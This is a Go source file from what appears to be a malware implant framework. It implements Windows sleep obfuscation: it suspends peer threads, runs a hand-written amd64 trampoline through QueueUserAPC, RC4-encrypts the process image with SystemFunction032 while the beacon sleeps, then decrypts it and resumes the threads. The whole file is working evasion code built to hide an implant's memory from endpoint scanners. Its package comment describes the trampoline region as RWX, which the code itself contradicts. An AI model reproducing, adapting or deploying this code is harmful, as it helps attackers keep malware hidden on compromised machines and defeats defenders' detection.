// Package apc implements Windows sleep obfuscation for the Go implant.
//
// Per cycle, Sleep:
//  1. Snapshots and suspends every other image-based OS thread.
//  2. Queues a hand-written amd64 trampoline via QueueUserAPC.
//  3. Enters an alertable wait; the trampoline runs on this thread:
//     VirtualProtect(image, RW) -> RC4 encrypt -> NtDelayExecution ->
//     RC4 decrypt -> VirtualProtect(.text, RX) -> ret.
//  4. Resumes suspended peers.
//
// The trampoline lives in a VirtualAlloc'd RWX region outside the image,
// so it survives the encryption pass. It only calls into ntdll /
// kernel32 / advapi32; it never re-enters the encrypted Go .text.
//
// Because Go's runtime independently suspends/resumes threads (sysmon
// async preemption) and can deadlock when SuspendThread lands on an M
// mid-syscall, every peer suspend and resume is guarded by a per-peer
// Windows thread-pool timer that force-resumes the peer if the beacon
// gets stuck.
//
// See ANALYSIS.md for the full design rationale.
package apc

import (
	"crypto/rand"
	"errors"
	"fmt"
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	pageReadWrite   uintptr = 0x04
	pageExecuteRead uintptr = 0x20

	memCommit  uintptr = 0x1000
	memReserve uintptr = 0x2000
	memRelease uintptr = 0x8000

	// NtQueryInformationThread information classes.
	threadQuerySetWin32StartAddress uintptr = 0x9
	threadSuspendCount              uintptr = 0x23 // undocumented, stable since Win10 1607

	// Post-SuspendThread pause, to let the kernel commit each suspension
	// before the trampoline mutates memory.
	commitDelayMs int64 = 5

	// Bound on ResumeThread drain iterations per peer. Typical is 1-2.
	maxResumeDrain = 1024

	// Watchdog timeouts (ms). The suspend-phase margin scales with
	// sleepMs; the resume phase is fixed.
	watchdogMarginMinMs = 5000
	watchdogMarginMaxMs = 15000
	resumeWatchdogMs    = 8000
	wtExecuteOnlyOnce   = 0x00000008

	// (DWORD)-1 zero-extended into a uintptr on x64 — the
	// SuspendThread/ResumeThread failure sentinel.
	dwordMinusOne uintptr = 0xFFFFFFFF
)

var (
	kernel32                  = syscall.NewLazyDLL("kernel32.dll")
	procGetModuleHandleA      = kernel32.NewProc("GetModuleHandleA")
	procVirtualAlloc          = kernel32.NewProc("VirtualAlloc")
	procVirtualFree           = kernel32.NewProc("VirtualFree")
	procVirtualProtect        = kernel32.NewProc("VirtualProtect")
	procQueueUserAPC          = kernel32.NewProc("QueueUserAPC")
	procSuspendThread         = kernel32.NewProc("SuspendThread")
	procResumeThread          = kernel32.NewProc("ResumeThread")
	procCreateTimerQueueTimer = kernel32.NewProc("CreateTimerQueueTimer")
	procDeleteTimerQueueTimer = kernel32.NewProc("DeleteTimerQueueTimer")

	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procNtDelayExecution         = ntdll.NewProc("NtDelayExecution")
	procNtWaitForSingleObject    = ntdll.NewProc("NtWaitForSingleObject")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")

	advapi32              = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = advapi32.NewProc("SystemFunction032")

	// .text section bounds, resolved once at init and reused every cycle.
	textSectionBase uintptr
	textSectionSize uintptr
)

// ustring is the SystemFunction032 argument descriptor
// (ULONG Length, ULONG MaximumLength, PVOID Buffer).
type ustring struct {
	Length        uint32
	MaximumLength uint32
	Buffer        uintptr
}

// imageNTHeaders64Prefix reads just enough of IMAGE_NT_HEADERS64 to reach
// SizeOfImage in the optional header.
type imageNTHeaders64Prefix struct {
	Signature uint32
	// IMAGE_FILE_HEADER (20 bytes)
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
	// IMAGE_OPTIONAL_HEADER64 (partial, up to SizeOfImage)
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
}

// discoverTextSection walks the PE section headers to find the .text
// section's runtime bounds.
func discoverTextSection(imageBase uintptr) (base, size uintptr, err error) {
	eLfaNew := *((*uint32)(unsafe.Pointer(imageBase + 0x3c)))
	peHeader := imageBase + uintptr(eLfaNew)

	// IMAGE_FILE_HEADER starts at peHeader + 4 (after "PE\0\0").
	numSections := *((*uint16)(unsafe.Pointer(peHeader + 4 + 2)))
	sizeOfOptHdr := *((*uint16)(unsafe.Pointer(peHeader + 4 + 16)))

	// Section array immediately follows the optional header.
	sectionsStart := peHeader + 4 + 20 + uintptr(sizeOfOptHdr)

	for i := uint16(0); i < numSections; i++ {
		sec := sectionsStart + uintptr(i)*40
		name := (*[8]byte)(unsafe.Pointer(sec))
		if name[0] == '.' && name[1] == 't' && name[2] == 'e' &&
			name[3] == 'x' && name[4] == 't' && name[5] == 0 {
			virtualSize := *((*uint32)(unsafe.Pointer(sec + 8)))
			virtualAddress := *((*uint32)(unsafe.Pointer(sec + 12)))
			return imageBase + uintptr(virtualAddress), uintptr(virtualSize), nil
		}
	}
	return 0, 0, errors.New("apc: .text section not found in PE headers")
}

// apcArgs is the struct passed to the trampoline via QueueUserAPC's dwData.
//
// FIELD OFFSETS ARE HARD-CODED IN THE TRAMPOLINE MACHINE CODE. Do not
// reorder, resize, or insert fields without also updating the trampoline
// AND the init-time offset assertion below.
type apcArgs struct {
	imageBase        uintptr // 0x00
	imageSize        uintptr // 0x08
	oldProt          uint32  // 0x10  (VirtualProtect out-param)
	_pad             uint32  // 0x14
	img              ustring // 0x18  (16 bytes)
	key              ustring // 0x28  (16 bytes)
	delayInterval    int64   // 0x38  (100-ns units, negative = relative)
	virtualProtect   uintptr // 0x40
	systemFunc032    uintptr // 0x48
	ntDelayExecution uintptr // 0x50
	textBase         uintptr // 0x58
	textSize         uintptr // 0x60
}

// trampoline is hand-written amd64 machine code invoked as a
// QueueUserAPC callback. On entry, RCX points to an apcArgs struct.
//
//	VirtualProtect(imageBase, imageSize, PAGE_READWRITE,  &oldProt)
//	SystemFunction032(&img, &key)                          // encrypt
//	NtDelayExecution(FALSE, &delayInterval)
//	SystemFunction032(&img, &key)                          // decrypt (RC4 symmetric)
//	VirtualProtect(textBase, textSize, PAGE_EXECUTE_READ, &oldProt)
//	ret
//
// The final VirtualProtect restores only .text to RX — not the whole
// image to RWX. .rdata / .data are left as PAGE_READWRITE. See
// ANALYSIS.md for the tradeoff.
var trampoline = []byte{
	// Prologue: push rbx; sub rsp, 0x30; mov rbx, rcx. Stack ends
	// 16-aligned for the calls that follow.
	0x53,
	0x48, 0x83, 0xEC, 0x30,
	0x48, 0x89, 0xCB,

	// VirtualProtect(imageBase, imageSize, PAGE_READWRITE, &oldProt)
	0x48, 0x8B, 0x4B, 0x00, // mov rcx, [rbx+0x00]
	0x48, 0x8B, 0x53, 0x08, // mov rdx, [rbx+0x08]
	0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, // mov r8d, 0x04
	0x4C, 0x8D, 0x4B, 0x10, // lea r9,  [rbx+0x10]
	0xFF, 0x53, 0x40, // call qword ptr [rbx+0x40]

	// SystemFunction032(&img, &key) -- encrypt
	0x48, 0x8D, 0x4B, 0x18,
	0x48, 0x8D, 0x53, 0x28,
	0xFF, 0x53, 0x48,

	// NtDelayExecution(FALSE, &delayInterval). Non-alertable: no
	// unrelated APC can slip in between encrypt and decrypt.
	0x33, 0xC9,
	0x48, 0x8D, 0x53, 0x38,
	0xFF, 0x53, 0x50,

	// SystemFunction032(&img, &key) -- decrypt
	0x48, 0x8D, 0x4B, 0x18,
	0x48, 0x8D, 0x53, 0x28,
	0xFF, 0x53, 0x48,

	// VirtualProtect(textBase, textSize, PAGE_EXECUTE_READ, &oldProt)
	0x48, 0x8B, 0x4B, 0x58,
	0x48, 0x8B, 0x53, 0x60,
	0x41, 0xB8, 0x20, 0x00, 0x00, 0x00, // mov r8d, 0x20
	0x4C, 0x8D, 0x4B, 0x10,
	0xFF, 0x53, 0x40,

	// Epilogue
	0x48, 0x83, 0xC4, 0x30,
	0x5B,
	0xC3,
}

func init() {
	// Resolve every Windows procedure at startup so a bad symbol
	// name fails loudly here instead of panicking on the first Sleep.
	for _, p := range []*syscall.LazyProc{
		procGetModuleHandleA, procVirtualAlloc, procVirtualFree,
		procVirtualProtect, procQueueUserAPC, procSuspendThread, procResumeThread,
		procCreateTimerQueueTimer, procDeleteTimerQueueTimer,
		procNtDelayExecution, procNtWaitForSingleObject, procNtQueryInformationThread,
		procSystemFunction032,
	} {
		if err := p.Find(); err != nil {
			panic(fmt.Sprintf("apc: cannot resolve %s: %v", p.Name, err))
		}
	}

	// The trampoline references apcArgs by hard-coded byte offset. A
	// silent struct-layout drift would produce a crash inside the
	// encrypted window on the first Sleep() call.
	var a apcArgs
	mustOffset("imageBase", unsafe.Offsetof(a.imageBase), 0x00)
	mustOffset("imageSize", unsafe.Offsetof(a.imageSize), 0x08)
	mustOffset("oldProt", unsafe.Offsetof(a.oldProt), 0x10)
	mustOffset("img", unsafe.Offsetof(a.img), 0x18)
	mustOffset("key", unsafe.Offsetof(a.key), 0x28)
	mustOffset("delayInterval", unsafe.Offsetof(a.delayInterval), 0x38)
	mustOffset("virtualProtect", unsafe.Offsetof(a.virtualProtect), 0x40)
	mustOffset("systemFunc032", unsafe.Offsetof(a.systemFunc032), 0x48)
	mustOffset("ntDelayExecution", unsafe.Offsetof(a.ntDelayExecution), 0x50)
	mustOffset("textBase", unsafe.Offsetof(a.textBase), 0x58)
	mustOffset("textSize", unsafe.Offsetof(a.textSize), 0x60)

	imageBase, _, _ := procGetModuleHandleA.Call(0)
	if imageBase == 0 {
		panic("apc: GetModuleHandleA returned NULL at init")
	}
	tBase, tSize, err := discoverTextSection(imageBase)
	if err != nil {
		panic(fmt.Sprintf("apc: %v", err))
	}
	textSectionBase = tBase
	textSectionSize = tSize
}

func mustOffset(name string, got, want uintptr) {
	if got != want {
		panic(fmt.Sprintf("apc: apcArgs.%s at offset 0x%X, expected 0x%X", name, got, want))
	}
}

// healResidualSuspends drains any residual kernel suspend counts left on
// image-based peers by prior cycles. Uses NtQueryInformationThread
// (ThreadSuspendCount) to READ counts — no Suspend/Resume probing — so
// it introduces no new race with sysmon's async preemption.
func healResidualSuspends(currentTID uint32, imageBase, imageEnd uintptr) {
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return
	}
	defer windows.CloseHandle(hSnapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	if err := windows.Thread32First(hSnapshot, &te); err != nil {
		return
	}

	currentPID := uint32(windows.GetCurrentProcessId())

	for {
		if te.OwnerProcessID == currentPID && te.ThreadID != currentTID {
			hThread, openErr := windows.OpenThread(
				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID,
			)
			if openErr == nil {
				var startAddr, retLen uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					threadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&startAddr)),
					unsafe.Sizeof(startAddr),
					uintptr(unsafe.Pointer(&retLen)),
				)
				if startAddr >= imageBase && startAddr < imageEnd {
					var suspCount uint32
					var qRetLen uintptr
					status, _, _ := procNtQueryInformationThread.Call(
						uintptr(hThread),
						threadSuspendCount,
						uintptr(unsafe.Pointer(&suspCount)),
						unsafe.Sizeof(suspCount),
						uintptr(unsafe.Pointer(&qRetLen)),
					)
					if status == 0 && suspCount > 0 {
						for i := uint32(0); i < uint32(maxResumeDrain); i++ {
							r, _, _ := procResumeThread.Call(uintptr(hThread))
							if r == 0 || r == 1 || r == dwordMinusOne {
								break
							}
						}
					}
				}
				windows.CloseHandle(hThread)
			}
		}
		if err := windows.Thread32Next(hSnapshot, &te); err != nil {
			break
		}
	}
}

// peerState is one suspended image-based peer plus its watchdog timer.
// The handle stays open for the duration of the cycle.
type peerState struct {
	tid     uint32
	hThread windows.Handle
	hTimer  uintptr
}

// suspendAndArmPeers enumerates image-based peer threads, arms a per-peer
// watchdog timer for each, and then SuspendThreads it. Order matters: if
// SuspendThread deadlocks in exitsyscall (the P-handoff race), the
// watchdog must already be armed to rescue us.
//
// The watchdog callback is procResumeThread.Addr() -- a raw Windows API
// pointer, not a Go callback. A Go callback would need a P to run and
// would deadlock in the same way as the caller.
func suspendAndArmPeers(
	currentTID uint32,
	imageBase, imageEnd uintptr,
	wdTimeoutMs uint64,
) ([]peerState, error) {
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(hSnapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	if err := windows.Thread32First(hSnapshot, &te); err != nil {
		return nil, err
	}

	currentPID := uint32(windows.GetCurrentProcessId())
	peers := make([]peerState, 0, 32)

	for {
		if te.OwnerProcessID == currentPID && te.ThreadID != currentTID {
			hThread, openErr := windows.OpenThread(
				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID,
			)
			if openErr == nil {
				var startAddr, retLen uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					threadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&startAddr)),
					unsafe.Sizeof(startAddr),
					uintptr(unsafe.Pointer(&retLen)),
				)
				if startAddr >= imageBase && startAddr < imageEnd {
					var hTimer uintptr
					wdRet, _, _ := procCreateTimerQueueTimer.Call(
						uintptr(unsafe.Pointer(&hTimer)),
						0,
						procResumeThread.Addr(),
						uintptr(hThread),
						uintptr(wdTimeoutMs),
						0,
						wtExecuteOnlyOnce,
					)
					r, _, _ := procSuspendThread.Call(uintptr(hThread))
					if r != dwordMinusOne {
						peers = append(peers, peerState{
							tid:     te.ThreadID,
							hThread: hThread,
							hTimer:  hTimer,
						})
					} else {
						if wdRet != 0 {
							procDeleteTimerQueueTimer.Call(0, hTimer, ^uintptr(0))
						}
						windows.CloseHandle(hThread)
					}
				} else {
					windows.CloseHandle(hThread)
				}
			}
		}
		if err := windows.Thread32Next(hSnapshot, &te); err != nil {
			break
		}
	}
	return peers, nil
}

// cancelWatchdogs cancels every peer's suspend-phase watchdog timer.
// INVALID_HANDLE_VALUE as CompletionEvent tells DeleteTimerQueueTimer to
// wait for any in-flight callback -- so on return, each peer's suspend
// count is stable.
func cancelWatchdogs(peers []peerState) {
	for i := range peers {
		if peers[i].hTimer != 0 {
			procDeleteTimerQueueTimer.Call(0, peers[i].hTimer, ^uintptr(0))
			peers[i].hTimer = 0
		}
	}
}

// verifyAllPeersSuspended checks each peer's ThreadSuspendCount. Returns
// (true, 0) if all are suspended; otherwise (false, firstUnsuspendedTID).
// Called after cancelWatchdogs, so counts are stable during the check.
func verifyAllPeersSuspended(peers []peerState) (bool, uint32) {
	for _, p := range peers {
		var count uint32
		var retLen uintptr
		status, _, _ := procNtQueryInformationThread.Call(
			uintptr(p.hThread),
			threadSuspendCount,
			uintptr(unsafe.Pointer(&count)),
			unsafe.Sizeof(count),
			uintptr(unsafe.Pointer(&retLen)),
		)
		if status != 0 || count == 0 {
			return false, p.tid
		}
	}
	return true, 0
}

// armResumeWatchdogs installs a per-peer one-shot timer that fires
// ResumeThread on that peer after resumeWatchdogMs. Symmetric with the
// suspend-phase arming, guarding the resume loop against the same
// P-handoff race.
func armResumeWatchdogs(peers []peerState) {
	for i := range peers {
		var hTimer uintptr
		procCreateTimerQueueTimer.Call(
			uintptr(unsafe.Pointer(&hTimer)),
			0,
			procResumeThread.Addr(),
			uintptr(peers[i].hThread),
			uintptr(resumeWatchdogMs),
			0,
			wtExecuteOnlyOnce,
		)
		peers[i].hTimer = hTimer
	}
}

// resumeAndClose cancels each peer's watchdog, drains its suspend count
// with ResumeThread, and closes the handle. Sysmon may have piled on an
// extra suspension while our own was in effect, so a single ResumeThread
// isn't always enough — we drain until the count reaches 0 or 1.
func resumeAndClose(peers []peerState) {
	for _, p := range peers {
		if p.hTimer != 0 {
			procDeleteTimerQueueTimer.Call(0, p.hTimer, ^uintptr(0))
		}
		for i := 0; i < maxResumeDrain; i++ {
			r, _, _ := procResumeThread.Call(uintptr(p.hThread))
			if r == 0 || r == 1 || r == dwordMinusOne {
				break
			}
		}
		windows.CloseHandle(p.hThread)
	}
}

// watchdogTimeoutMs returns (sleepMs + margin), where the margin is
// clamped so short beacons rescue quickly and long beacons don't wait
// forever. Also caps the total at DWORD_MAX (CreateTimerQueueTimer's
// DueTime is DWORD).
func watchdogTimeoutMs(sleepMs uint64) uint64 {
	margin := sleepMs
	if margin < watchdogMarginMinMs {
		margin = watchdogMarginMinMs
	} else if margin > watchdogMarginMaxMs {
		margin = watchdogMarginMaxMs
	}
	total := sleepMs + margin
	if total > 0x7FFFFFFF {
		total = 0x7FFFFFFF
	}
	return total
}

// Sleep obfuscates the process image for sleepMs milliseconds.
//
// Correctness invariants:
//   - LockOSThread pins the beacon goroutine for the whole call, so the
//     APC is delivered to the same thread that enters the alertable wait.
//   - The trampoline lives in a separate VirtualAlloc'd RWX region, not
//     in the image, so it survives the encryption pass.
//   - The trampoline never re-enters Go .text; it only calls into
//     ntdll / kernel32 / advapi32.
//   - apcArgs is heap-allocated (Go escape analysis promotes it because
//     we hand its address to unmanaged code) so the trampoline can
//     dereference it after we've entered the wait.
func Sleep(sleepMs uint64) error {
	if sleepMs == 0 {
		return nil
	}

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	imageBase, _, _ := procGetModuleHandleA.Call(0)
	if imageBase == 0 {
		return errors.New("apc: GetModuleHandleA returned NULL")
	}
	eLfaNew := *((*uint32)(unsafe.Pointer(imageBase + 0x3c)))
	nt := (*imageNTHeaders64Prefix)(unsafe.Pointer(imageBase + uintptr(eLfaNew)))
	imageSize := uintptr(nt.SizeOfImage)

	var keyBuf [16]byte
	if _, err := rand.Read(keyBuf[:]); err != nil {
		return err
	}

	// Trampoline lives OUTSIDE the image mapping. Allocate as RW, copy
	// the bytes in, then flip to RX before executing -- avoids ever
	// having an RWX region outside the image, which is a strong IOC.
	tramp, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(len(trampoline)),
		memCommit|memReserve,
		pageReadWrite,
	)
	if tramp == 0 {
		return errors.New("apc: VirtualAlloc for trampoline failed")
	}
	defer procVirtualFree.Call(tramp, 0, memRelease)
	copy(unsafe.Slice((*byte)(unsafe.Pointer(tramp)), len(trampoline)), trampoline)

	var oldProt uint32
	vpRet, _, _ := procVirtualProtect.Call(
		tramp,
		uintptr(len(trampoline)),
		pageExecuteRead,
		uintptr(unsafe.Pointer(&oldProt)),
	)
	if vpRet == 0 {
		return errors.New("apc: VirtualProtect trampoline to RX failed")
	}

	args := &apcArgs{
		imageBase: imageBase,
		imageSize: imageSize,
		img: ustring{
			Length:        uint32(imageSize),
			MaximumLength: uint32(imageSize),
			Buffer:        imageBase,
		},
		key: ustring{
			Length:        uint32(len(keyBuf)),
			MaximumLength: uint32(len(keyBuf)),
			Buffer:        uintptr(unsafe.Pointer(&keyBuf[0])),
		},
		delayInterval:    -int64(sleepMs) * 10_000, // 100-ns units, negative = relative
		virtualProtect:   procVirtualProtect.Addr(),
		systemFunc032:    procSystemFunction032.Addr(),
		ntDelayExecution: procNtDelayExecution.Addr(),
		textBase:         textSectionBase,
		textSize:         textSectionSize,
	}

	// Real handle to self. The GetCurrentThread pseudo-handle works with
	// QueueUserAPC in practice but isn't documented as guaranteed.
	currentTID := windows.GetCurrentThreadId()
	hSelf, err := windows.OpenThread(
		windows.THREAD_SET_CONTEXT|windows.THREAD_QUERY_INFORMATION,
		false,
		currentTID,
	)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hSelf)

	imageEnd := imageBase + imageSize

	// Drain any residual suspensions before touching anything else. This
	// step does not itself Suspend/Resume, so it introduces no new race.
	healResidualSuspends(currentTID, imageBase, imageEnd)

	// Suspend peers with per-peer watchdogs armed inline before each
	// SuspendThread call.
	wdTimeoutMs := watchdogTimeoutMs(sleepMs)
	peers, err := suspendAndArmPeers(currentTID, imageBase, imageEnd, wdTimeoutMs)
	if err != nil {
		return err
	}

	// Cancel watchdogs and verify all peers are still suspended before
	// starting encryption. If a watchdog fired during the suspend loop,
	// the corresponding peer is running -- encrypting now would AV that
	// peer on its next instruction fetch. Abort the cycle instead.
	cancelWatchdogs(peers)
	if allSuspended, _ := verifyAllPeersSuspended(peers); !allSuspended {
		armResumeWatchdogs(peers)
		resumeAndClose(peers)
		return nil
	}

	// Let the kernel commit each SuspendThread before we mutate memory.
	commitDelay := -commitDelayMs * 10_000
	procNtDelayExecution.Call(0, uintptr(unsafe.Pointer(&commitDelay)))

	ret, _, _ := procQueueUserAPC.Call(
		tramp,
		uintptr(hSelf),
		uintptr(unsafe.Pointer(args)),
	)
	if ret == 0 {
		armResumeWatchdogs(peers)
		resumeAndClose(peers)
		return errors.New("apc: QueueUserAPC failed")
	}

	// Enter the alertable wait. NtWaitForSingleObject on our own process
	// handle can only return via the APC completion path -- the process
	// handle never signals from inside the process. Timeout=NULL = INFINITE.
	procNtWaitForSingleObject.Call(
		uintptr(windows.CurrentProcess()),
		1, // Alertable = TRUE
		0, // Timeout = NULL
	)

	// Image is decrypted and .text is executable again; safe to resume peers.
	armResumeWatchdogs(peers)
	resumeAndClose(peers)

	runtime.KeepAlive(keyBuf)
	runtime.KeepAlive(args)
	return nil
}
